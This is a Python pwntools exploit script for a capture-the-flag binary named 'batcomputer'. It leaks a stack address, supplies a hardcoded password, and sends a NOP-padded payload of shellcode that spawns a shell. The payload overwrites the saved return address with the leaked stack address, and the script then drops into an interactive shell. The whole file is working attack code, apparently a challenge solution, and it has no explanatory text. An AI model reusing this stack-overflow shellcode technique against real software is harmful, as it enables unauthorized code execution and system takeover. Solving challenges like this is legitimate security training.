from pwn import *
import os

os.system('clear')

def start(argv=[], *a, **kw):
    if args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else: 
        return process([exe] + argv, *a, **kw)

exe = './batcomputer'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'debug'

## EXPLOITATION

paddingBytes = 84 #EIP/RIP offset
sh = start()

sh.sendlineafter('>', '1')
extractedStack_addr = int(re.search(r"(0x[\w\d]+)", sh.recvlineS()).group(0), 16)
info("extractedStack_addr (joker's offset): %#x", extractedStack_addr)

shellcode = asm(shellcraft.popad()) 
shellcode += asm(shellcraft.sh())
padding = asm('nop') * (paddingBytes - len(shellcode)) 

payload = flat([
    padding,
    shellcode,
    extractedStack_addr
])

sh.sendlineafter(b'>', b'2') 
sh.sendlineafter(b'Enter the password:', b'b4tp@$$w0rd!') 
sh.sendlineafter(b'Enter the navigation commands:', payload) 
sh.sendlineafter(b'>', b'130') # to trigger return 
sh.recvuntil("Too bad, now who's gonna save Gotham? Alfred?\n")

sh.interactive()
